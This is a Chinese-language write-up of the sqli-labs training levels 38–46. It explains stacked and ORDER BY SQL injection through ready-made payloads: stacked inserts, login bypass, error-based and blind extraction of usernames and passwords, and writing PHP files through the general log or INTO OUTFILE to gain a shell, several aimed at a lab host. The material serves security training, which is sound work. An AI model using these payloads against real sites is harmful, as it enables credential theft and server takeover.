# 堆叠注入 38-53 关

## 原理介绍

MySQL 的命令行中，每一条语句以`;`结尾，这代表语句的结束，如果在注入过程中在`;`后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。下面就是简单的示例：

```bash
mysql> select * from users where id = 1;select version();
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set (0.00 sec)

+-------------------------+
| version()               |
+-------------------------+
| 5.5.44-0ubuntu0.14.04.1 |
+-------------------------+
1 row in set (0.00 sec)
```

与 union select 联合查询相比，堆叠查询更加灵活，可以执行任意的 SQL 语句。

### 局限性

1. 并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎。
2. 在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略

这个就是为什么我们尝试用 union select 联合查询的原因，使用堆叠注入前，我们还需要了解数据库的相关信息才可以，如表名、列名等

### 各个数据库堆叠查询实例

**MySQL**

sql

```sql
select * from users where id=1;select version();
```

**SQL Server**

mssql

```mssql
select 1,2,3;select * from test;
```

**Postgresql**

sql

```sql
select * from user_test;select 1,2,3;
```

# Less-38

```
http://daishen.ltd:1112/Less-38/?id=1';insert into users(username,password) values ('hello','world');
```

### 开启日志 Getshell

需要条件：

1. Web 的物理路径
2. MySQL 可以读写 Web 目录
3. Windows 成功率 高于 Linux

首先查看当前的日志的相关配置：

```bash
mysql> SHOW VARIABLES LIKE 'general%';
+------------------+---------------------------------+
| Variable_name    | Value                           |
+------------------+---------------------------------+
| general_log      | OFF                             |
| general_log_file | /var/lib/mysql/bb198f1a9cc6.log |
+------------------+---------------------------------+
```

Docker 里面的这个 Ubuntu 环境默认是没有开启的，这里尝试注入的时候手动开启：

```payload
?id=1';set global general_log = "ON";set global general_log_file='/var/www/html/shell.php';--+
```

然后 MySQL 再查看日志配置是否被修改了：

```bash
mysql> SHOW VARIABLES LIKE 'general%';
+------------------+-------------------------+
| Variable_name    | Value                   |
+------------------+-------------------------+
| general_log      | ON                      |
| general_log_file | /var/www/html/shell.php |
+------------------+-------------------------+
```

这个尝试 getshell：

```sql
?id=1';select <?php phpinfo();?>
```

日志里面就会记录`<?php phpinfo();?>`，浏览器访问查看：

查看一下当的日志文件：

```sql
$ cat /var/www/html/shell.php
200517  8:47:04       10 Connect    root@localhost on security
           10 Init DB    security
           10 Query    SELECT * FROM users WHERE id='1';select '<?php phpinfo();?>'-- ' LIMIT 0,1
```

此时已经成功写入了，但是因为这个文件属于 mysql 用户组的，测试并没有成功执行：

```bash
$ ls -l  /var/www/html/shell.php
-rw-rw---- 1 mysql mysql 171 May 17 08:47 /var/www/html/shell.php
```

# Less-39

和 Less-38 相比没有啥区别，只是拼接方式不一样。同上题，只不过没有单引号 

# Less-40

和 Less-38 相比没有啥区别，只是拼接方式不一样。同上题，只不过加上单引号和右括号 ‘) 

# Less-41

和 Less-39 类似，因为少了报错输出，所以这里不能报错注入，其他注入方式一样

# Less-42

这一题漏洞比较多，首先 login.php 中 password 没有过滤，可以进行常规的报错注入以及盲注，同时本身又支持堆叠查询，所以也支持堆叠注入。 pass_change.php update 语句存在漏洞，典型的二次注入，类似于 Less-24

### 经典的**万能密码**绕过 `1' or 1#`:

```http
POST /Less-42/login.php HTTP/1.1
...

login_user=admin&login_password=1' or 1#&mysubmit=Login
```

因为登录成功后返回：

```php
return $row[1];
```

所以登录了 id 为 1 的 Dumb 用户

### 尝试**联合查询**:

```http
POST /Less-42/login.php HTTP/1.1
...

login_user=admin&login_password=1' union select 1,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,password,0x3c62723e))))x),3#&mysubmit=Login
```

### **报错注入**：

```payload
login_user=admin&login_password=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#&mysubmit=Login
```

同理这里也可以进行盲注和堆叠查注入

# Less-43

| 请求方式 | 注入类型                                 | 拼接方式                 |
| :------- | :--------------------------------------- | :----------------------- |
| POST     | 联合、报错、布尔盲注、延时盲注、堆叠注入 | `username=('$username')` |

和 Less-42 的利用方式一致，这里只是拼接方式不一样而已，只不过多了一个c’); 

# Less-44

| 请求方式 | 注入类型                           | 拼接方式               |
| :------- | :--------------------------------- | :--------------------- |
| POST     | 联合、布尔盲注、延时盲注、堆叠注入 | `username='$username'` |

和 Less-43 的利用方式一致，因为没有输出报错信息，所以这里少了报错注入的利用方式。

# Less-45

| 请求方式 | 注入类型                           | 拼接方式                 |
| :------- | :--------------------------------- | :----------------------- |
| POST     | 联合、布尔盲注、延时盲注、堆叠注入 | `username=('$username')` |

与 Less-43 闭合方式一致，只是这里少了报错注入的利用方法。

# Less-46

| 请求方式 | 注入类型                 | 拼接方式       |
| :------- | :----------------------- | :------------- |
| GET      | 报错、布尔盲注、延时盲注 | `ORDER BY $id` |

```php
# GET 方式获取 sort 参数
$id=$_GET['sort'];

# 直接将 id 带入 SQL 中
$sql = "SELECT * FROM users ORDER BY $id";

if 查询成功：
    输出查询信息
else：
    print_r(mysql_error());
```

order by 不同于 where 后的注入点，不能使用 union 等进行注入。注入方式十分灵活，下面在本关来详细讲解一下。

### 验证方式

- **升序和降序验证

```bash
# 升序排序
?sort=1 asc

# 降序排序
?sort=1 dasc
```

- **rand() 验证**

rand(ture) 和 rand(false) 的结果是不一样的

```payload
?sort=rand(true)
?sort=rand(false)
```

所以利用这个可以轻易构造出一个布尔和延时类型盲注的测试 payload

此外 rand() 结果是一直都是随机的

```none
?sort=rand()
?sort=1 and rand()
```

- **延时验证

```payload
?sort=sleep(1)
?sort=(sleep(1))
?sort=1 and sleep(1)
```

这种方式均可以延时，延时的时间为 (行数*1) 秒

### 报错注入1

```payload
?sort=1+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)
```

### 报错注入2

利用 procedure analyse 参数，也可以执行报错注入。

```payload
?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)
?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,(SELECT+CONCAT_WS(':',username,password)+FROM+users limit 0,1))),1)
```

### 报错注入3

```
爆表：
http://daishen.ltd:1112/Less-46/?sort=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+

暴列：
http://daishen.ltd:1112/Less-46/?sort=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) --+

暴值：
http://daishen.ltd:1112/Less-46/?sort=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) --+

显示未完全：
http://daishen.ltd:1112/Less-46/?sort=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in ('Dumb','Angelina')))) --+
```

### 布尔盲注

数据库第 1 位为：s

```payload
暴库payload
http://daishen.ltd:1112/Less-46/?sort=rand(left(database(),1)='s')
http://daishen.ltd:1112/Less-46/?sort=rand(left(database(),2)='se')
http://daishen.ltd:1112/Less-46/?sort=rand(left(database(),3)='sec')
http://daishen.ltd:1112/Less-46/?sort=rand(left(database(),4)='secu')

爆表paylaod
http://daishen.ltd:1112/Less-46/?sort=rand(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),1)='u')

爆列名payload
http://daishen.ltd:1112/Less-46/?sort=rand(left((select column_name from information_schema.columns where table_name='users' limit 0,1),1)='i')

爆字段payload
http://daishen.ltd:1112/Less-46/?sort=rand(left((select username from users limit 0,1),1)='d')
```

### 延时盲注

数据库第一个字母的 ascii 码为 115，即`s`

```payload
?sort=rand(if(ascii(substr(database(),1,1))>114,1,sleep(1)))
?sort=rand(if(ascii(substr(database(),1,1))>115,1,sleep(1)))
```

### into outfile

**将查询结果导入到文件中**：

```sql
?sort=1 into outfile "/var/www/html/less46.txt"
```

如果导入不成功的话，很可能是因为 Web 目前 MySQL 没有读写权限造成的。

访问验证是否有信息：

```bash
$ curl http://127.0.0.1:8888/less46.txt
1    Dumb    Dumb
2    Angelina    I-kill-you
3    Dummy    p@ssword
4    secure    crappy
5    stupid    stupidity
6    superman    genious
7    batman    mob!le
8    admin    admin
9    admin1    admin1
10    admin2    admin2
11    admin3    admin3
12    dhakkan    dumbo
14    admin4    admin4
```

**利用导出文件 getshell**：

注入天书里面提供了 lines terminated by 姿势用于 order by 的情况来 getsgell：

```payload
?sort=1 into outfile "/var/www/html/less46.php" lines terminated by 0x3c3f70687020706870696e666f28293b3f3e
```

3c3f70687020706870696e666f28293b3f3e 是 `<php phpinfo();>` 的十六进制编码。

来查看下写入的文件内容是啥样子的：

```bash
$ cat /var/www/html/less46.php 
1    Dumb    Dumb<?php phpinfo();?>2    Angelina    I-kill-you<?php phpinfo();?>3    Dummy    p@ssword<?php phpinfo();?>4    secure    crappy<?php phpinfo();?>5    stupid    stupidity<?php phpinfo();?>6    superman    genious<?php phpinfo();?>7    batman    mob!le<?php phpinfo();?>8    admin    admin<?php phpinfo();?>9    admin1    admin1<?php phpinfo();?>10    admin2    admin2<?php phpinfo();?>11    admin3    admin3<?php phpinfo();?>12    dhakkan    dumbo<?php phpinfo();?>14    admin4    admin4<?php phpinfo();?>
```

